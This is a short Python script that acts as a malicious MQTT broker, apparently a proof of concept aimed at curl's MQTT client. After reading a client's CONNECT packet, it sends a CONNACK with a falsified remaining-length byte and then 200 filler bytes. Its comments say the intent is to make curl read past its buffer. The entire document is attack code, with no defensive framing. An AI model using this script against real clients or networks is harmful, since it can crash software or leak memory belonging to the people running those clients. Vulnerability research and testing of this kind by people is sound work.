import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 1883))  # Standard MQTT port
sock.listen(5)

print("MQTT Malice Broker Listening on 1883...")

while True:
    conn, addr = sock.accept()
    try:
        # Read CONNECT packet from curl
        data = conn.recv(1024)
        print(f"Received: {data}")

        # THE ATTACK: Send a malformed CONNACK
        # Byte 0: Packet Type (2 = CONNACK)
        # Byte 1: Remaining Length (Should be 2, we say 127 to indicate more data follows)
        # Byte 2: Session Present flag
        # Byte 3: Return Code (0 = Accepted)

        # We lie about the length to force curl to read past the buffer
        bad_packet = bytes([0x20, 0x7F, 0x00, 0x00])

        conn.send(bad_packet)
        # Send garbage to fill the buffer we promised
        conn.send(b'A' * 200)

    except Exception as e:
        pass
    finally:
        conn.close()